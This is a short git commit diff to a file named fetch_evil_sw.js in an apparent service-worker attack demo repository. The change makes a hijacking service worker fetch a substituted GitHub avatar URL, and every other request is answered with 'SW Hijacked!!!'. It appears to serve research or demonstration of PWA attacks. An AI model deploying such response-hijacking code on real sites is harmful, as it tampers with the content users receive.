eedf8ab3f8c13fe53f8311cd3c58393524a4c22c
DemoPWA <54972549+DemoPWA@users.noreply.github.com>
2022-02-10 16:17:38 -0500

    Update fetch_evil_sw.js

--- SW_Attacks/helper_scripts/fetch_evil_sw.js
+++ SW_Attacks/helper_scripts/fetch_evil_sw.js
@@ -1,6 +1,8 @@
 self.getResponse = async function(url){  
   if (url == 'https://avatars0.githubusercontent.com/u/70142'){
     url = 'https://avatars0.githubusercontent.com/u/70143'
+    var response = await fetch(url)
+    return response
   }
   const response = new Response('SW Hijacked!!!');
   return response
